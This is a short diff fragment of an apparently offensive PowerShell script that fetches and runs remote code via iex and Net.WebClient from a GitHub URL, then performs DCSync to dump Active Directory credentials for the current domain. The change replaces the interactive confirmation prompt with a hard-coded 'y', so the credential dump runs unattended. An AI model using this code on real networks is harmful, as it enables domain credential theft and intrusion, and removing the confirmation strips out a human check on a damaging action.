@@ -66,7 +66,7 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 $domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
 Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
 
-$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
+$confirmation = 'y'
 if ($confirmation -eq 'y') {
 
     # create directory for storage
